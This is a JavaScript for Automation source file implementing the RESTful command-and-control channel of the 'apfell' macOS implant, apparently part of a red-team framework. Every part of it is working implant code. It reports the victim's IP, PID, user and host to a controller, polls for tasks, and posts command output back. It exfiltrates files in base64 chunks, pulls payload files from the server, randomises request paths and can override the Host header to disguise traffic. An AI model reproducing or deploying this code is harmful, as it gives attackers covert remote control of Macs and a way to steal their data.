//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{

	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.get_file_path = "GETFILE";
        this.get_next_task = "GETNEXTTASK";
        this.post_new_callback = "NEWCALLBACK";
        this.post_response = "POSTRESPONSE";
        this.id_field = "IDSTRING";
        this.host_header = "YYY";
	}
	getRandomMixed(size){
	    return [...Array(size)].map(i=>(~~(Math.random()*36)).toString(36)).join('')
	}
	getRandomNumber(size){
	    return [...Array(size)].map(i=>(~~(Math.random()*10)).toString(10)).join('')
	}
	getRandomAlpha(size){
	    var s = "abcdefghijklmnopqrstuvwxyz";
	    return Array(size).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	}
	getGetFilePath(id){
	    var temp = this.get_file_path.replace(this.id_field, id);
	    return this.stringReplaceRandomizations(temp);
	}
	getNextTaskPath(id){
	    var temp = this.get_next_task.replace(this.id_field, id);
	    return this.stringReplaceRandomizations(temp);
	}
	getPostResponsePath(id){
	    var temp = this.post_response.replace(this.id_field, id);
	    return this.stringReplaceRandomizations(temp);
	}
	getPostNewCallbackPath(){
	    var temp = this.post_new_callback;
	    return this.stringReplaceRandomizations(temp);
	}
    stringReplaceRandomizations(string){
        //console.log("called string randomize with: " + string);
        //will get a string like: /admin.php?q=5&page=(N4)&query=(M20)
        var pieces = string.split("("); //[/admin.php?q=5&page=, N4)&query=, M20)]
        //console.log("Pieces are: " + pieces.toString());
        //if there are no requested transformations, then we'll have an array of length one and won't do the loop
        var final_string = pieces[0];
        for(var i = 1; i < pieces.length; i++){
            var arg_split = pieces[i].split(")"); //[N4, &query=] and [M20,'']
            //console.log("arg_split: " + arg_split.toString());
            var config = arg_split[0]; //N4 and M20
            var type = config[0]; //N and M
            var size = parseInt(config.slice(1,)); //4 and 20
            if(type == "N"){
                //console.log("calling getRandomNumber with size: " + size);
                final_string += this.getRandomNumber(size);
            }
            else if(type == "M"){
                final_string += this.getRandomMixed(size);
            }
            else if(type == "A"){
                //console.log("calling getRandomAlpha with size: " + size);
                final_string += this.getRandomAlpha(size);
            }
            final_string += arg_split[1];
        }
        return final_string;
    }
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(",")});
	}
	setConfig(params){
		//A RESTful base config has 3 updatable components
		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
		if(params['commands'] != undefined){
		    this.commands = params['commands'];
		}
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
		apfell.id = jsondata.id;
		// if we fail to get an ID number then exit the application
		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		while(true){
		    try{
		        var url = this.baseurl + this.getNextTaskPath(apfell.id);
		        //var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		        var task = this.htmlGetData(url);
		        return JSON.parse(task);
		    }
		    catch(error){
		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
		    }
		}

	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse(this.getPostResponsePath(task.id), output);
	    //return this.postRESTResponse("api/v1.0/responses/" + task.id, output);
	}
	postRESTResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		var size= 512000;
		var offset = 0;
		//console.log("total response size: " + data.length);
		do{
		    var csize = data.length - offset > size ? size : data.length - offset;
		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
		    offset += csize;
		    var postData = {"response": encodedChunk};
		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
		}while(offset < data.length);

		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				if( this.host_header.length > 3){
				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
				}
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				//console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(url){
	    while(true){
	        try{
	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                if( this.host_header.length > 3){
                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                }
                var response = Ref();
                var error = Ref();
                var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                return ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
	            //var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	            //return data;
	        }
	        catch(error){
	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        if( does_file_exist(params)){
            var offset = 0;
            var url = this.getPostResponsePath(task.id);
            var chunkSize = 512000; //3500;
            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
            // Get the file size by seeking;
            var fileSize = handle.seekToEndOfFile;
            // always round up to account for chunks that are < chunksize;
            var numOfChunks = Math.ceil(fileSize / chunkSize);
            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
            var registerData = convert_to_nsdata(registerData);
            var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
            //var registerFile = this.postResponse(task, registerData);
            if (registerFile['status'] == "success"){
                handle.seekToFileOffset(0);
                var currentChunk = 1;
                var data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                    fileData = convert_to_nsdata(fileData);
                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}));
                    //this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.interval);

                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                var output = "Finished downloading file with id: " + registerFile['file_id'];
                output += "\nBrowse to /api/v1.0/files/" + registerFile['file_id'];
            }
            else{
               var output = "Failed to register file to download";
            }
        }
        else{
            var output = "file does not exist";
        }
        return output;
	}
	upload(task, params){
	    try{
	        var url = this.getGetFilePath(params);
	        //var url = "api/v1.0/files/" + params;
            var file_data = this.htmlGetData(this.baseurl + url);
            var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
            //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
            return decoded_data;
            //var output = write_data_to_file(decoded_data, file_path);
            //return output;
	    }catch(error){
	        return error.toString();
	    }

	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
C2 = new customC2(callback_interval, "callback_host:callback_port");
